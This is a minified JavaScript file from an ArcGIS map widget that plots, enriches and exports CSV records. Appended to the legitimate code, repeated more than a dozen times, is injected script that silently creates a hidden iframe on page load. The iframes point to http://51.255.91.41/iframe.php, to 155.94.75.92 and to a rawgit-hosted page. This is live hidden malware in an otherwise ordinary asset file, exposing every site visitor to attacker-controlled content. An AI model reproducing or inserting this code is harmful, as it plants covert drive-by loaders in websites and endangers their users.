"";this.resultsPlotting.innerHTML=e.substitute(this.nls.results.recordsPlotted,{0:0,1:0})},downloadCSVResults:function(){console.log(this.featureLayer);var a=B.createDataSource({type:B.TYPE_FEATURESET,filename:this.nls.savingCSV,data:w.toFeatureSet(this.featureLayer.graphics)});a.setFormat(B.FORMAT_CSV);a.download()},clearCSVResults:function(){this.layerLoaded&&this.map.removeLayer(this.featureLayer);this._resetResults();d.add(this.downloadResultsBtn,"hide");d.add(this.results,"hide");f.set(this.enrichErrorsList,
"display","none");d.remove(this.showFileDialogBtn,"jimu-state-disabled");d.add(this.clearResultsBtn,"jimu-state-disabled")},destroy:function(){this.layerLoaded&&this.map.removeLayer(this.featureLayer);this.inherited(arguments)},_getSeparator:function(a){var b=0,d="";c.forEach([",","      ",";","|"],function(c){var e=a.split(c).length;e>b&&(b=e,d=c)});return d},_generateFeatureCollectionTemplateCSV:function(a,d){var e={featureSet:{features:[],geometryType:"esriGeometryPoint",spatialReference:{wkid:102100}},
layerDefinition:{geometryType:"esriGeometryPoint",objectIdField:"__OBJECTID",type:"Feature Layer",typeIdField:"",fields:[{name:"__OBJECTID",alias:"Row Number",type:"esriFieldTypeOID",editable:!1,domain:null}],types:[],capabilities:"Query"}};this.csvFields=a.getAttributes(d[0]);this.combinedFields=b.clone(this.csvFields);this.combinedFields.push(this.config.intersectField);c.forEach(this.combinedFields,function(b){var c=a.getValue(d[0],b);isNaN(Number(c))||b===this.config.intersectField?e.layerDefinition.fields.push({name:b,
alias:b,type:"esriFieldTypeString",editable:!0,domain:null}):e.layerDefinition.fields.push({name:b,alias:b,type:"esriFieldTypeDouble",editable:!0,domain:null})},this);e.layerDefinition.fields.push({name:"Out",alias:"GLProcessed",type:"esriFieldTypeString",editable:!1,visible:!1,domain:null});this.combinedFields=this.combinedFields.concat(this.lookupLayersFieldNames);e.layerDefinition.fields=e.layerDefinition.fields.concat(this.lookupLayersFields);return e},_generateDefaultPopupInfo:function(a){var d=
{esriFieldTypeDouble:1,esriFieldTypeSingle:1},e={esriFieldTypeInteger:1,esriFieldTypeSmallInteger:1},g={esriFieldTypeDate:1},f=null;a=c.map(a.layerDefinition.fields,b.hitch(this,function(a){"NAME"===a.name.toUpperCase()&&(f=a.name);var c="esriFieldTypeGlobalID"!==a.type&&"esriFieldTypeGeometry"!==a.type;"GLProcessed"===a.alias&&(c=!1);var k=null;if(c){var h=a.name.toLowerCase();if(-1<",stretched value,fnode_,tnode_,lpoly_,rpoly_,poly_,subclass,subclass_,rings_ok,rings_nok,".indexOf(","+h+",")||h.indexOf("_i")===
h.length-2)c=!1;a.type in e?k={places:0,digitSeparator:!0}:a.type in d?k={places:4,digitSeparator:!0}:a.type in g&&(k={dateFormat:"shortDateShortTime"})}return b.mixin({},{fieldName:a.name,label:a.alias,isEditable:!1,tooltip:"",visible:c,format:k,stringFieldOption:"textbox"})}));return{title:f?"{"+f+"}":"",fieldInfos:a,description:null,showAttachments:!1,mediaInfos:[]}},_buildInfoTemplate:function(a){var b={content:'\x3cdiv style\x3d"font-weight:bold;"\x3e'+this.nls.results.label+'\x3c/div\x3e\x3cdiv style\x3d"border:none;border-top: 1px solid #333333;margin-top: 6px;margin-bottom: 6px;"\x3e\x3c/div\x3e\x3ctable\x3e'};
c.forEach(a.fieldInfos,function(a){a.visible&&(b.content+='\x3ctr\x3e\x3ctd valign\x3d"top" style\x3d"color:#888888;padding-right:5px;"\x3e',b.content+=a.label+": \x3c/td\x3e",b.content+='\x3ctd valign\x3d"top" style\x3d"padding:2px;padding-bottom:5px;"\x3e${',b.content+=a.fieldName+"}\x3c/td\x3e\x3c/tr\x3e")});b.content+="\x3c/table\x3e";return b},_zoomToData:function(a){var b=new D(this.map.spatialReference);c.forEach(a.graphics,function(a){(a=a.geometry)&&b.addPoint({x:a.x,y:a.y})});a.name="CSV Layer";
this.map.addLayer(this.featureLayer);this.layerLoaded=!0;0<b.points.length&&(this.map.setExtent(b.getExtent().expand(1.05),!0),this.chkboxPlotOnly.checked&&d.remove(this.showFileDialogBtn,"jimu-state-disabled"))},showErrorTable:function(){if("none"===f.get(this.enrichErrorsList,"display")){var a="";c.forEach(this.errorList,b.hitch(this,function(b){a=a+e.substitute(this.nls.results.recordsErrorList,{0:b})+"\x3cbr\x3e"}));this.enrichErrorsList.innerHTML=a;f.set(this.enrichErrorsList,"display","block")}else f.set(this.enrichErrorsList,
"display","none")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});